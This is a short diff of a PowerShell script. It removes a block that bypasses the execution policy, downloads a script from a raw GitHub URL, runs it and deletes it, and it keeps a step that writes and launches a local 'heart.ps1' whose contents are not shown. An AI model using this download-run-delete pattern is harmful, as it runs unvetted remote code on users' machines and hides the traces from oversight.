@@ -1,13 +1,3 @@
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-
-$scriptPath = "$PSScriptRoot\temp_2.ps1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath
-
-& $scriptPath
-
-Remove-Item $scriptPath -Force
-
-# Start-Process "https://ncsgroup.vn/"
 
 $heartScriptPath = Join-Path $PSScriptRoot "heart.ps1"
 $heartScriptContent = @'
@@ -30,5 +20,3 @@ Set-Content -Path $heartScriptPath -Value $heartScriptContent -Encoding UTF8
 Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-File", $heartScriptPath
 
 Remove-Item $heartScriptPath -Force
-
-exit
